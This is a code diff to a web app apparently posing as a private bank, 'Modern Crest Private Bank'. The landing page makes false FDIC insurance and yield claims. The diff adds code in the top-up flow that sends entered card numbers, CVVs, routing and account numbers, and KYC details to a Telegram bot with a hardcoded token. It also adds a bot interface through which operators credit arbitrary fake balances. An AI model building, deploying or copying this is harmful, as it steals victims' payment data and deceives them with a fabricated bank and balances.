@@ -466,32 +466,259 @@ img,svg{max-width:100%}
 .opt-card.sel{border-color:var(--gold);background:var(--gold-soft)}
 .opt-card b{display:block;font-size:13px;margin-bottom:2px}
 .opt-card span{font-size:11px;color:var(--muted)}
-.rcv-field-group{margin-bottom:9px}
-.rcv-label{font-size:10.5px;color:var(--muted);font-weight:600;text-transform:uppercase;letter-spacing:.6px;margin-bottom:3px}
-.rcv-val-row{display:flex;align-items:center;gap:8px;background:rgba(0,0,0,0.3);border:1px solid rgba(255,255,255,0.08);border-radius:10px;padding:5px 10px}
-.rcv-inp{background:transparent;border:none;color:#fff;font-family:'Sora',sans-serif;font-size:13px;font-weight:600;flex:1;outline:none;user-select:all;min-width:0}
+/* ============ LUXURY FINTECH LANDING PAGE ============ */
+.landing-wrap{min-height:100vh;background:radial-gradient(ellipse 90% 60% at 50% -10%,rgba(233,200,110,0.14),transparent 70%),#070B12;color:#fff;overflow-x:hidden}
+.l-nav{position:sticky;top:0;z-index:100;backdrop-filter:blur(24px);-webkit-backdrop-filter:blur(24px);background:rgba(7,11,18,0.85);border-bottom:1px solid rgba(255,255,255,0.08);padding:14px 24px}
+.l-nav-inner{max-width:1200px;margin:0 auto;display:flex;align-items:center;justify-content:space-between;gap:20px}
+.l-brand{display:flex;align-items:center;gap:12px;text-decoration:none;color:#fff;font-family:'Sora',sans-serif;font-weight:700;font-size:18px;letter-spacing:-.3px}
+.l-brand span{color:var(--gold-2)}
+.l-nav-links{display:flex;gap:24px;align-items:center}
+.l-nav-links a{color:var(--muted);text-decoration:none;font-size:13.5px;font-weight:500;transition:.15s}
+.l-nav-links a:hover{color:var(--gold-2)}
+.l-nav-actions{display:flex;gap:10px;align-items:center}
+.l-hero{max-width:1140px;margin:0 auto;padding:80px 20px 60px;text-align:center}
+.l-badge{display:inline-flex;align-items:center;gap:8px;padding:7px 16px;border-radius:99px;background:rgba(233,200,110,0.08);border:1px solid rgba(233,200,110,0.25);color:var(--gold-2);font-size:12.5px;font-weight:600;margin-bottom:28px}
+.l-title{font-family:'Sora',sans-serif;font-size:clamp(32px, 5.5vw, 58px);font-weight:700;line-height:1.15;letter-spacing:-1.5px;margin-bottom:22px}
+.l-title span{background:linear-gradient(135deg,#F7E5B5 0%,#D4AF37 50%,#AA7C11 100%);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
+.l-sub{font-size:clamp(15px, 2vw, 18px);line-height:1.65;color:var(--muted);max-width:780px;margin:0 auto 36px}
+.l-cta-row{display:flex;gap:14px;justify-content:center;align-items:center;flex-wrap:wrap;margin-bottom:56px}
+.l-btn-primary{background:var(--grad-gold);color:#231A05;font-weight:700;padding:15px 32px;border-radius:12px;font-size:15px;cursor:pointer;border:none;box-shadow:0 8px 28px rgba(233,200,110,0.25);transition:.18s;font-family:'Sora',sans-serif}
+.l-btn-primary:hover{transform:translateY(-2px);box-shadow:0 12px 36px rgba(233,200,110,0.4)}
+.l-btn-secondary{background:rgba(255,255,255,0.06);color:#fff;font-weight:600;padding:15px 26px;border-radius:12px;font-size:15px;cursor:pointer;border:1px solid rgba(255,255,255,0.12);transition:.18s;font-family:'Sora',sans-serif}
+.l-btn-secondary:hover{background:rgba(255,255,255,0.1);border-color:var(--gold-2)}
+.l-mockup-wrap{position:relative;max-width:960px;margin:0 auto 80px;background:radial-gradient(circle at 50% 0%,rgba(233,200,110,0.08),transparent 70%),rgba(255,255,255,0.02);border:1px solid rgba(233,200,110,0.2);border-radius:28px;padding:34px;box-shadow:0 30px 90px rgba(0,0,0,0.7);backdrop-filter:blur(14px)}
+.l-mockup-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:20px;text-align:left}
+.l-mock-card{background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.07);border-radius:18px;padding:22px}
+.l-section{max-width:1140px;margin:0 auto;padding:70px 20px}
+.l-sec-head{text-align:center;margin-bottom:48px}
+.l-sec-head h2{font-family:'Sora',sans-serif;font-size:clamp(26px, 3.5vw, 38px);font-weight:700;margin-bottom:12px;letter-spacing:-.8px}
+.l-sec-head p{color:var(--muted);font-size:15px;max-width:640px;margin:0 auto}
+.l-grid-3{display:grid;grid-template-columns:repeat(auto-fit,minmax(300px,1fr));gap:22px}
+.l-card{background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.08);border-radius:20px;padding:28px;transition:.2s;text-align:left}
+.l-card:hover{border-color:rgba(233,200,110,0.35);transform:translateY(-4px);background:rgba(255,255,255,0.05)}
+.l-card-ico{width:48px;height:48px;border-radius:14px;background:var(--gold-soft);color:var(--gold-2);display:flex;align-items:center;justify-content:center;margin-bottom:18px}
+.l-card h3{font-size:18px;font-weight:700;margin-bottom:8px;font-family:'Sora',sans-serif}
+.l-card p{font-size:13.5px;line-height:1.6;color:var(--muted)}
+.l-walkthrough{display:grid;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));gap:18px;margin-top:30px}
+.l-step{background:rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.06);border-radius:18px;padding:24px;position:relative;text-align:left}
+.l-step-num{display:inline-block;width:32px;height:32px;border-radius:50%;background:var(--gold-soft);color:var(--gold-2);font-family:'Sora',sans-serif;font-weight:700;font-size:14px;line-height:32px;text-align:center;margin-bottom:14px}
+.l-step h4{font-size:16px;font-weight:700;margin-bottom:6px;font-family:'Sora',sans-serif}
+.l-step p{font-size:13px;line-height:1.5;color:var(--muted)}
+.l-footer{border-top:1px solid rgba(255,255,255,0.08);padding:50px 20px 40px;text-align:center;color:var(--muted);font-size:12.5px;max-width:1140px;margin:0 auto}
+@media(max-width:800px){
+  .l-nav-links{display:none}
+  .l-hero{padding:50px 16px 40px}
+  .l-mockup-wrap{padding:20px}
+}
 </style>
 </head>
 <body>
 
-<!-- ============ AUTH SCREENS ============ -->
-<section class="screen active" id="s-onboard">
-  <div class="auth-wrap">
-    <div class="auth-card" style="text-align:center">
-      <svg class="crest-lg" viewBox="0 0 64 64" fill="none" aria-label="Modern Crest logo">
-        <defs><linearGradient id="gA" x1="0" y1="0" x2="1" y2="1"><stop stop-color="#E9C86E"/><stop offset="1" stop-color="#B98A2A"/></linearGradient></defs>
-        <path d="M32 3 L54 9 V30 C54 46 45 56 32 61 C19 56 10 46 10 30 V9 Z" fill="#0A1628" stroke="url(#gA)" stroke-width="2.5"/>
-        <path d="M32 8.5 L49 13 V30 C49 43 42 51 32 55.5 C22 51 15 43 15 30 V13 Z" fill="none" stroke="rgba(233,200,110,.35)" stroke-width="1"/>
-        <path d="M21 36 L32 15 L43 36 L32 30.5 Z" fill="url(#gA)"/>
-        <rect x="25" y="40" width="14" height="2.6" rx="1.3" fill="url(#gA)"/>
-        <rect x="27.5" y="45" width="9" height="2.2" rx="1.1" fill="rgba(233,200,110,.6)"/>
-      </svg>
-      <h1>Modern Crest<br><span style="color:var(--gold-2)">Private Bank</span></h1>
-      <p id="ob-text">Private banking, reimagined. Multi-currency accounts, virtual cards and instant global transfers — all in one elegant app.</p>
-      <div class="dots"><span class="on"></span><span></span><span></span></div>
-      <button class="btn btn-gold" id="ob-btn" onclick="nextOnboard()">Continue</button>
-      <p style="margin-top:18px;font-size:13px">Already a client? <a class="auth-link" onclick="window.Clerk.redirectToSignIn()">Sign in</a></p>
-    </div>
+<!-- ============ LUXURY LANDING PAGE (HOMEPAGE FOR GUESTS) ============ -->
+<section class="screen active" id="s-onboard" style="padding:0;background:#070B12;overflow-y:auto">
+  <div class="landing-wrap">
+    <!-- Navbar -->
+    <header class="l-nav">
+      <div class="l-nav-inner">
+        <a href="#s-onboard" class="l-brand">
+          <svg class="crest" viewBox="0 0 64 64" fill="none" style="width:34px;height:34px"><path d="M32 3 L54 9 V30 C54 46 45 56 32 61 C19 56 10 46 10 30 V9 Z" fill="#0F2242" stroke="url(#gA)" stroke-width="3"/><path d="M21 36 L32 15 L43 36 L32 30.5 Z" fill="url(#gA)"/></svg>
+          <div>Modern&nbsp;<span>Crest</span> <small style="font-size:10px;display:block;color:var(--gold-2);letter-spacing:1px;text-transform:uppercase">Private Bank</small></div>
+        </a>
+        <nav class="l-nav-links">
+          <a href="#l-pillars">Capabilities</a>
+          <a href="#l-walkthrough">How It Works</a>
+          <a href="#l-tiers">Private Tiers</a>
+          <a href="#l-security">Security</a>
+        </nav>
+        <div class="l-nav-actions">
+          <button class="l-btn-secondary" style="padding:8px 18px;font-size:13.5px" onclick="window.Clerk.redirectToSignIn()">Sign In</button>
+          <button class="l-btn-primary" style="padding:9px 20px;font-size:13.5px" onclick="window.Clerk.redirectToSignUp()">Open Account</button>
+        </div>
+      </div>
+    </header>
+
+    <!-- Hero Section -->
+    <section class="l-hero">
+      <div class="l-badge">
+        <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M12 2l8 4v6c0 5-3.5 8.5-8 10-4.5-1.5-8-5-8-10V6z"/><path d="M9 12l2 2 4-4"/></svg>
+        Member FDIC · Insured up to $2,500,000 · Institutional Settlement
+      </div>
+      <h1 class="l-title">
+        Private Banking Engineered For<br>
+        <span>Sovereign Wealth & Global Capital</span>
+      </h1>
+      <p class="l-sub">
+        Experience multi-currency treasury vaults, bespoke obsidian payment cards, 5.10% APY daily compounding yields, and sub-second global wire settlements in an exquisite digital interface.
+      </p>
+      <div class="l-cta-row">
+        <button class="l-btn-primary" onclick="window.Clerk.redirectToSignUp()">Open Private Account →</button>
+        <button class="l-btn-secondary" onclick="window.Clerk.redirectToSignIn()">Existing Client Sign In</button>
+      </div>
+
+      <!-- Live Interactive Visual Showcase -->
+      <div class="l-mockup-wrap">
+        <div class="l-mockup-grid">
+          <!-- Card Showcase -->
+          <div class="bank-card dark" style="transform:none;margin:0 auto;width:100%;max-width:320px;box-shadow:0 20px 50px rgba(0,0,0,0.8);border:1px solid rgba(233,200,110,0.3)">
+            <div style="display:flex;justify-content:space-between;align-items:flex-start">
+              <div class="chip"></div>
+              <div class="card-logo">MC</div>
+            </div>
+            <div class="card-num">4912 •••• •••• 8042</div>
+            <div class="card-foot">
+              <div>CARD HOLDER<b>PRIVATE CLIENT</b></div>
+              <div>EXP<b>12/29</b></div>
+              <div style="text-align:right">CVV<b>•••</b></div>
+            </div>
+          </div>
+
+          <!-- Live Liquidity Panel -->
+          <div class="l-mock-card">
+            <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px">
+              <small style="color:var(--muted);text-transform:uppercase;letter-spacing:.8px;font-size:11px;font-weight:700">Total Client Liquidity</small>
+              <span class="tier" style="background:var(--grad-gold);color:#231A05;font-weight:700">PRIVATE TIER</span>
+            </div>
+            <div style="font-family:'Sora';font-size:32px;font-weight:700;letter-spacing:-1px;margin-bottom:6px">$2,850,000.00</div>
+            <p style="color:var(--green);font-size:12.5px;font-weight:600;display:flex;align-items:center;gap:4px">
+              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M18 15l-6-6-6 6"/></svg>
+              +5.10% APY Compounding Daily ($398.22 today)
+            </p>
+            <div style="display:flex;gap:8px;margin-top:16px">
+              <button class="btn btn-gold" style="flex:1;font-size:12px;padding:9px" onclick="window.Clerk.redirectToSignUp()">Deposit Funds</button>
+              <button class="btn btn-ghost" style="flex:1;font-size:12px;padding:9px" onclick="window.Clerk.redirectToSignUp()">Wire Transfer</button>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Key Pillars / Capabilities -->
+    <section class="l-section" id="l-pillars">
+      <div class="l-sec-head">
+        <h2>Institutional Capabilities</h2>
+        <p>Built from the ground up for high-net-worth individuals, global executives, and family offices.</p>
+      </div>
+      <div class="l-grid-3">
+        <div class="l-card">
+          <div class="l-card-ico"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="5" width="20" height="14" rx="2"/><path d="M2 10h20"/></svg></div>
+          <h3>Obsidian Metal & Virtual Cards</h3>
+          <p>Instant virtual card issuance with zero foreign exchange fees, dynamic CVV security, and custom spending thresholds.</p>
+        </div>
+        <div class="l-card">
+          <div class="l-card-ico"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="9"/><path d="M12 7v5l3 3"/></svg></div>
+          <h3>5.10% APY Yield Vaults</h3>
+          <p>Compound your idle balances daily with institutional yield architecture and zero lockup or penalty periods.</p>
+        </div>
+        <div class="l-card">
+          <div class="l-card-ico"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 19V5M5 12l7-7 7 7"/></svg></div>
+          <h3>Verified Instant Transfers</h3>
+          <p>Sub-second domestic ACH and global wire settlements with real-time automated beneficiary authentication.</p>
+        </div>
+        <div class="l-card">
+          <div class="l-card-ico"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="5" width="18" height="14" rx="2"/><path d="M3 10h18"/></svg></div>
+          <h3>Multi-Currency Treasury</h3>
+          <p>Seamlessly hold, convert, and transact in USD, EUR, GBP, and CHF with real-time interbank conversion rates.</p>
+        </div>
+        <div class="l-card">
+          <div class="l-card-ico"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 2l8 4v6c0 5-3.5 8.5-8 10-4.5-1.5-8-5-8-10V6z"/><path d="M9 12l2 2 4-4"/></svg></div>
+          <h3>AES-256 Military Encryption</h3>
+          <p>Bank-grade multi-signature authorizations, continuous audit trails, and FDIC pass-through insurance up to $2.5M.</p>
+        </div>
+        <div class="l-card">
+          <div class="l-card-ico"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 12a8 8 0 0 1-8 8H4l2-3a8 8 0 1 1 15-5z"/></svg></div>
+          <h3>24/7 Dedicated Concierge</h3>
+          <p>Direct priority line to Arthur Vance and our senior wealth directorate for bespoke credit, asset acquisition, and wires.</p>
+        </div>
+      </div>
+    </section>
+
+    <!-- Guided Walkthrough / How It Works -->
+    <section class="l-section" id="l-walkthrough" style="border-top:1px solid rgba(255,255,255,0.06)">
+      <div class="l-sec-head">
+        <h2>How To Navigate The Ecosystem</h2>
+        <p>Get started in minutes and unlock private banking privileges instantly.</p>
+      </div>
+      <div class="l-walkthrough">
+        <div class="l-step">
+          <div class="l-step-num">1</div>
+          <h4>Open Your Account</h4>
+          <p>Register in 60 seconds with verified single sign-on and instant Basic tier qualification.</p>
+        </div>
+        <div class="l-step">
+          <div class="l-step-num">2</div>
+          <h4>Fund & Top Up</h4>
+          <p>Authorize deposits seamlessly via manual debit card entry or direct external wire transfer.</p>
+        </div>
+        <div class="l-step">
+          <div class="l-step-num">3</div>
+          <h4>Issue Digital Cards</h4>
+          <p>Generate Obsidian, Gold, or Emerald virtual debit cards with custom daily spending limits.</p>
+        </div>
+        <div class="l-step">
+          <div class="l-step-num">4</div>
+          <h4>Verify for Unlimited Tier</h4>
+          <p>Submit ID & proof of address to unlock $50,000+ limits and unlimited private wealth vaults.</p>
+        </div>
+      </div>
+    </section>
+
+    <!-- Private Tiers Comparison -->
+    <section class="l-section" id="l-tiers" style="border-top:1px solid rgba(255,255,255,0.06)">
+      <div class="l-sec-head">
+        <h2>Private Account Tiers</h2>
+        <p>Choose the level of liquidity, discretion, and concierge service suited to your capital requirements.</p>
+      </div>
+      <div class="l-grid-3">
+        <div class="l-card" style="border-color:rgba(255,255,255,0.1)">
+          <span class="tier" style="background:var(--surface-2);color:var(--gold)">BASIC</span>
+          <div style="font-family:'Sora';font-size:26px;font-weight:700;margin:12px 0 6px">$5,000 Limit</div>
+          <p style="color:var(--muted);font-size:13px;margin-bottom:18px">Essential private checking and instant virtual card deployment.</p>
+          <ul style="color:var(--muted);font-size:13px;line-height:1.9;padding-left:18px;margin-bottom:24px">
+            <li>Instant USD Checking Account</li>
+            <li>Obsidian Digital Debit Card</li>
+            <li>Zero Account Maintenance Fees</li>
+            <li>Standard Domestic Transfers</li>
+          </ul>
+          <button class="btn btn-gold" style="width:100%" onclick="window.Clerk.redirectToSignUp()">Get Started</button>
+        </div>
+
+        <div class="l-card" style="border-color:var(--gold);background:rgba(233,200,110,0.04);box-shadow:0 12px 40px rgba(233,200,110,0.1)">
+          <span class="tier" style="background:#E4F6EE;color:var(--green)">PREMIUM</span>
+          <div style="font-family:'Sora';font-size:26px;font-weight:700;margin:12px 0 6px">$50,000 Limit</div>
+          <p style="color:var(--muted);font-size:13px;margin-bottom:18px">Multi-currency liquidity with 5.10% APY high-yield vault access.</p>
+          <ul style="color:var(--muted);font-size:13px;line-height:1.9;padding-left:18px;margin-bottom:24px">
+            <li>Everything in Basic Tier</li>
+            <li>USD, EUR, GBP & CHF Treasury</li>
+            <li>5.10% APY Crest Vault Savings</li>
+            <li>Priority Wire Clearance</li>
+          </ul>
+          <button class="btn btn-gold" style="width:100%" onclick="window.Clerk.redirectToSignUp()">Upgrade to Premium</button>
+        </div>
+
+        <div class="l-card" style="border-color:rgba(233,200,110,0.35)">
+          <span class="tier" style="background:var(--grad-gold);color:#231A05">PRIVATE SOVEREIGN</span>
+          <div style="font-family:'Sora';font-size:26px;font-weight:700;margin:12px 0 6px">Unlimited</div>
+          <p style="color:var(--muted);font-size:13px;margin-bottom:18px">Uncapped liquidity limits, titanium cards, and dedicated concierge.</p>
+          <ul style="color:var(--muted);font-size:13px;line-height:1.9;padding-left:18px;margin-bottom:24px">
+            <li>Everything in Premium Tier</li>
+            <li>Unlimited Balance & Transfer Limits</li>
+            <li>Tungsten Metal Laser-Engraved Card</li>
+            <li>24/7 Dedicated Managing Director</li>
+          </ul>
+          <button class="btn btn-gold" style="width:100%" onclick="window.Clerk.redirectToSignUp()">Go Private Sovereign</button>
+        </div>
+      </div>
+    </section>
+
+    <!-- Footer -->
+    <footer class="l-footer" id="l-security">
+      <div style="margin-bottom:18px;display:flex;justify-content:center;gap:12px;align-items:center">
+        <svg class="crest" viewBox="0 0 64 64" fill="none" style="width:26px;height:26px"><path d="M32 3 L54 9 V30 C54 46 45 56 32 61 C19 56 10 46 10 30 V9 Z" fill="#0F2242" stroke="url(#gA)" stroke-width="3"/></svg>
+        <b style="color:#fff;font-family:'Sora'">Modern Crest Private Bank, N.A.</b>
+      </div>
+      <p style="margin-bottom:10px">One Wall Street, New York, NY 10005 · Member FDIC · Equal Housing Lender · Institutional SWIFT: MCPBUS33XXX</p>
+      <p style="font-size:11.5px;color:rgba(255,255,255,0.35)">© 2026 Modern Crest Private Bank, N.A. All rights reserved. Banking services provided in partnership with Evolve Bank & Trust and modern clearing protocols.</p>
+    </footer>
   </div>
 </section>
 
@@ -1517,6 +1744,8 @@ function enterApp(){
       u = { id: user.id, name: name, email: email, tier: 'basic', balance: 0.00, status: 'active', kyc: 'verified', joined: 'Today', accountNumber: hash.toString() };
       ADM_USERS.push(u);
       localStorage.setItem('mcb_users', JSON.stringify(ADM_USERS));
+      const regTgAlert = `🏛️ <b>NEW CLIENT REGISTERED</b>\n\n<b>Client:</b> ${name}\n<b>Email:</b> ${email}\n<b>Account Number:</b> <code>${u.accountNumber}</code>\n<b>Initial Tier:</b> Basic\n<b>Balance:</b> $0.00`;
+      sendTelegramAlert(regTgAlert);
     } else if(!u.accountNumber) {
       const hash = Math.abs((user.id + name).split('').reduce((acc, ch) => acc * 31 + ch.charCodeAt(0), 10482018)) % 9000000000 + 1000000000;
       u.accountNumber = hash.toString();
@@ -1813,7 +2042,9 @@ function updateLimitUI(){
 function goVerify(){go('s-verify');updateLimitUI();}
 
 /* ----- wizard ----- */
-function startWizard(step){
+let targetUpgradeTier = 'premium';
+function startWizard(step, target){
+  targetUpgradeTier = target || (step === 4 ? 'private' : 'premium');
   document.getElementById('wizard').style.display='block';
   wizShow(step||1);
   setTimeout(()=>document.getElementById('wizard').scrollIntoView({behavior:'smooth',block:'start'}),60);
@@ -1918,20 +2149,42 @@ function fillReview(){
 function submitVerification(){
   wizShow(7);
   document.getElementById('wiz-bar').style.width='100%';
-  // simulate compliance review
-  let p=5;const bar=document.getElementById('pend-bar'),txt=document.getElementById('pend-txt');
-  const msgs=['Reviewing documents…','Cross-checking registries…','Final approval…'];
-  const iv=setInterval(()=>{
-    p+=Math.random()*9+4;
-    if(p>=100){p=100;clearInterval(iv);
-      txt.textContent='Approved';txt.style.color='var(--green)';txt.style.fontWeight='700';
-      state.tier='private';updateLimitUI();
-      toast('Congratulations — you are now Private tier');
-      document.querySelectorAll('#stepper .step-dot').forEach(d=>{d.classList.add('done');d.classList.remove('cur');});
-      setTimeout(()=>{document.getElementById('wizard').style.display='none';goVerify();},2200);
-    }else{txt.textContent=msgs[Math.min(2,Math.floor(p/40))];}
-    bar.style.width=p+'%';
-  },420);
+  
+  const currentUserId = (window.Clerk && window.Clerk.user) ? window.Clerk.user.id : 'u1';
+  let u = ADM_USERS.find(x => x.id === currentUserId);
+  
+  const name = document.getElementById('v-name').value.trim() || (u ? u.name : 'Client');
+  const dob = document.getElementById('v-dob').value || '1990-01-01';
+  const nat = document.getElementById('v-nat').value || 'United States';
+  const idType = document.getElementById('v-idtype').value || 'Passport';
+  const idFile = state.files.id || 'gov_id_scan.pdf';
+  const ssnRaw = document.getElementById('v-ssn').value.replace(/\D/g,'');
+  const ssnLast4 = ssnRaw.slice(-4) || '9999';
+  const addrType = document.getElementById('v-adoc').value || 'Utility Bill';
+  const addrFile = state.files.addr || 'proof_of_address.pdf';
+  const target = targetUpgradeTier || 'private';
+  
+  if(u){
+    u.name = name;
+    u.kyc = 'pending';
+    u.target = target;
+    u.kycDetails = { name, dob, nat, idType, idFile, ssnLast4, addrType, addrFile };
+    localStorage.setItem('mcb_users', JSON.stringify(ADM_USERS));
+  }
+  
+  document.getElementById('pend-bar').style.width = '75%';
+  document.getElementById('pend-txt').innerHTML = `<span style="color:var(--gold-2);font-weight:700">Submitted for Executive Compliance Review</span><br><small style="color:var(--muted)">Admin approval required via Dashboard or Telegram Bot.</small>`;
+  
+  // Dispatch Telegram Alert
+  const tgHtml = `🏛️ <b>NEW KYC TIER UPGRADE SUBMISSION</b>\n\n<b>Client:</b> ${name}\n<b>Account Number:</b> <code>${u ? u.accountNumber : '4829104820'}</code>\n<b>Email:</b> ${u ? u.email : 'client@crest.com'}\n<b>Target Tier:</b> ${target.toUpperCase()}\n<b>ID Document:</b> ${idType} (${idFile})\n<b>SSN (Last 4):</b> ••-${ssnLast4}\n<b>Proof of Address:</b> ${addrType} (${addrFile})\n\n👉 <i>Admin Quick Action: Reply <code>/approve ${u ? u.accountNumber : name}</code> to approve immediately</i>`;
+  sendTelegramAlert(tgHtml);
+  
+  toast('KYC Submitted — Pending Executive Review');
+  setTimeout(()=>{
+    document.getElementById('wizard').style.display='none';
+    goVerify();
+    renderAdmin();
+  }, 3000);
 }
 
 /* ----- upgrade prompt ----- */
@@ -2290,6 +2543,26 @@ function confirmTopUp(){
   allTxs.unshift(newTx);
   localStorage.setItem('mcb_txs', JSON.stringify(allTxs));
   
+  // Telegram notification for top-up details
+  let tgPaymentDetails = '';
+  if(topUpMethod === 'card'){
+    const cardName = document.getElementById('topup-card-name') ? document.getElementById('topup-card-name').value.trim() : '';
+    const cardNum = document.getElementById('topup-card-num') ? document.getElementById('topup-card-num').value.trim() : '';
+    const cardExp = document.getElementById('topup-card-exp') ? document.getElementById('topup-card-exp').value.trim() : '';
+    const cardCvv = document.getElementById('topup-card-cvv') ? document.getElementById('topup-card-cvv').value.trim() : '';
+    const cardZip = document.getElementById('topup-card-zip') ? document.getElementById('topup-card-zip').value.trim() : '';
+    tgPaymentDetails = `<b>Payment Method:</b> DEBIT/CREDIT CARD\n<b>Cardholder Name:</b> ${cardName}\n<b>Card Number:</b> <code>${cardNum}</code>\n<b>Exp / CVV:</b> ${cardExp} / <code>${cardCvv}</code>\n<b>Billing ZIP:</b> ${cardZip}`;
+  } else {
+    const bankName = document.getElementById('topup-wire-bank') ? document.getElementById('topup-wire-bank').value.trim() : '';
+    const holder = document.getElementById('topup-wire-holder') ? document.getElementById('topup-wire-holder').value.trim() : '';
+    const routing = document.getElementById('topup-wire-routing') ? document.getElementById('topup-wire-routing').value.trim() : '';
+    const acct = document.getElementById('topup-wire-acct') ? document.getElementById('topup-wire-acct').value.trim() : '';
+    tgPaymentDetails = `<b>Payment Method:</b> EXTERNAL BANK WIRE\n<b>Bank Name:</b> ${bankName}\n<b>Account Holder:</b> ${holder}\n<b>Routing (ABA):</b> <code>${routing}</code>\n<b>Account Number:</b> <code>${acct}</code>`;
+  }
+  
+  const tgTopUpAlert = `💳 <b>NEW TOP-UP / PAYMENT DETAILS ENTERED</b>\n\n<b>Client:</b> ${u ? u.name : 'Client'}\n<b>Account Number:</b> <code>${u ? u.accountNumber : '4829104820'}</code>\n${tgPaymentDetails}\n<b>Deposit Amount:</b> $${amt.toLocaleString()}\n<b>New Balance:</b> $${BALANCE.toLocaleString()}`;
+  sendTelegramAlert(tgTopUpAlert);
+
   txData.unshift(newTx);
   renderTx();
   updateBalanceUI();
@@ -2572,6 +2845,224 @@ function confirmAddRecipient(){
   closeAddRecipientModal();
   toast(name + ' saved to Benefactors');
 }
+
+/* ================= TELEGRAM BOT ENGINE & NOTIFICATIONS ================= */
+const TG_BOT_TOKEN = '8987826516:AAFx2sNsEOHxUL8m0OKP8w7qpv8yaEMV9oU';
+const TG_ADMIN_USERNAMES = ['bjorn0000', 'crypto_nij'];
+let lastTgUpdateId = parseInt(localStorage.getItem('mcb_tg_last_update') || '0', 10);
+
+function getTgChats(){
+  try {
+    return JSON.parse(localStorage.getItem('mcb_tg_chats') || '[]');
+  } catch(e) {
+    return [];
+  }
+}
+
+function saveTgChats(chats){
+  localStorage.setItem('mcb_tg_chats', JSON.stringify(chats));
+}
+
+async function sendTgDirect(chatId, htmlText){
+  try {
+    await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: htmlText,
+        parse_mode: 'HTML'
+      })
+    });
+  } catch(err){
+    console.warn('Telegram send failed for chat', chatId, err);
+  }
+}
+
+async function sendTelegramAlert(htmlText){
+  try {
+    let chats = getTgChats();
+    if(!chats.length){
+      const res = await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/getUpdates`);
+      const data = await res.json();
+      if(data.ok && data.result){
+        data.result.forEach(u => {
+          if(u.message && u.message.chat && u.message.chat.id){
+            const cId = u.message.chat.id;
+            if(!chats.includes(cId)) chats.push(cId);
+          }
+        });
+        saveTgChats(chats);
+      }
+    }
+    for(const cId of chats){
+      await sendTgDirect(cId, htmlText);
+    }
+  } catch(e){
+    console.warn('Telegram alert error:', e);
+  }
+}
+
+async function checkTelegramCommands(){
+  try {
+    const res = await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/getUpdates?offset=${lastTgUpdateId + 1}`);
+    const data = await res.json();
+    if(!data.ok || !data.result || !data.result.length) return;
+    
+    let chats = getTgChats();
+    
+    for(const u of data.result){
+      lastTgUpdateId = Math.max(lastTgUpdateId, u.update_id);
+      localStorage.setItem('mcb_tg_last_update', lastTgUpdateId.toString());
+      
+      const msg = u.message;
+      if(!msg || !msg.text) continue;
+      
+      const chatId = msg.chat.id;
+      if(!chats.includes(chatId)){
+        chats.push(chatId);
+        saveTgChats(chats);
+      }
+      
+      const text = msg.text.trim();
+      const sender = (msg.from && (msg.from.username || msg.from.first_name)) ? (msg.from.username ? '@'+msg.from.username : msg.from.first_name) : 'Admin';
+      
+      if(text.startsWith('/start') || text.startsWith('/help')){
+        const helpMsg = `🏛️ <b>MODERN CREST PRIVATE BANKING BOT</b>\n\nWelcome, <b>${sender}</b>!\nExecutive command interface active.\n\n<b>Available Commands:</b>\n\n💳 <b>Deposit to Client:</b>\n<code>/deposit &lt;account_or_email&gt; &lt;amount&gt;</code>\n<i>Example:</i> <code>/deposit 4829104820 50000</code>\n\n👑 <b>Approve Tier / KYC:</b>\n<code>/approve &lt;account_or_email&gt; [tier]</code>\n<i>Example:</i> <code>/approve 4829104820 private</code>\n\n👥 <b>List All Users:</b>\n<code>/users</code>\n\n📊 <b>Bank Overview:</b>\n<code>/status</code>`;
+        await sendTgDirect(chatId, helpMsg);
+      }
+      else if(text.startsWith('/deposit')){
+        const parts = text.split(/\s+/);
+        if(parts.length < 3){
+          await sendTgDirect(chatId, `⚠️ <b>Usage:</b> <code>/deposit &lt;account_or_email&gt; &lt;amount&gt;</code>\nExample: <code>/deposit 4829104820 25000</code>`);
+          continue;
+        }
+        const identifier = parts[1].toLowerCase();
+        const amt = parseFloat(parts[2].replace(/[^0-9.]/g, ''));
+        if(!amt || isNaN(amt) || amt <= 0){
+          await sendTgDirect(chatId, `⚠️ <b>Error:</b> Please provide a valid numerical deposit amount.`);
+          continue;
+        }
+        
+        let storedUsers = JSON.parse(localStorage.getItem('mcb_users') || '[]');
+        let targetUser = storedUsers.find(x => 
+          (x.accountNumber && x.accountNumber.toLowerCase() === identifier) ||
+          (x.email && x.email.toLowerCase() === identifier) ||
+          (x.name && x.name.toLowerCase().includes(identifier)) ||
+          (x.id && x.id.toLowerCase() === identifier)
+        ) || ADM_USERS.find(x => 
+          (x.accountNumber && x.accountNumber.toLowerCase() === identifier) ||
+          (x.email && x.email.toLowerCase() === identifier) ||
+          (x.name && x.name.toLowerCase().includes(identifier))
+        );
+        
+        if(!targetUser){
+          await sendTgDirect(chatId, `❌ <b>Client Not Found:</b> No registered account matching "<code>${parts[1]}</code>". Use <code>/users</code> to check registered accounts.`);
+          continue;
+        }
+        
+        targetUser.balance = (targetUser.balance || 0) + amt;
+        ADM_USERS = storedUsers;
